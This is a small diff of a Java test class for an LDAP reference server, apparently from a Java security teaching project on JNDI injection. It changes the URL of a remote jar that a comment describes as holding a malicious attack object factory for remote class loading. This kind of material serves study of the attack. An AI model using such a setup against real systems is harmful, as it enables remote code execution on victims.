@@ -29,7 +29,7 @@ public class LDAPReferenceServerTest {
 	public static String LDAP_URL = "ldap://" + BIND_HOST + ":" + SERVER_PORT + "/" + LDAP_ENTRY_NAME;
 
 	// 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
-	public static final String REMOTE_REFERENCE_JAR = "http://p2j.cn/tools/jndi-test.jar";
+	public static final String REMOTE_REFERENCE_JAR = "https://anbai.io/tools/jndi-test.jar";
 
 	// 设置LDAP基底DN
 	private static final String LDAP_BASE = "dc=javasec,dc=org";
